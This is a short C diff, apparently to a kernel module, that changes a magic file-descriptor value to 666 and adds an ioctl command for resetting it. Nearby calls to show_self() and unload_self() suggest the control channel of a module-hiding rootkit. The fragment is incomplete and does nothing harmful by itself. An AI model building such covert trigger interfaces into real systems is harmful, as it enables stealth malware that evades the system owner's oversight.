@@ -2,7 +2,7 @@
 #include "service.h"
 #include "load.h"
 
-unsigned int service_fd = 123;
+unsigned int service_fd = 666;
 
 int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
 {
@@ -19,7 +19,10 @@ int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
         case SERVICE_UNLOAD:
             show_self();
             unload_self();
-            break;        
+            break;
+        case SERVICE_CHANGE_FD:
+            service_fd = (unsigned int)arg;
+            break;
     }
     return 1;
 }
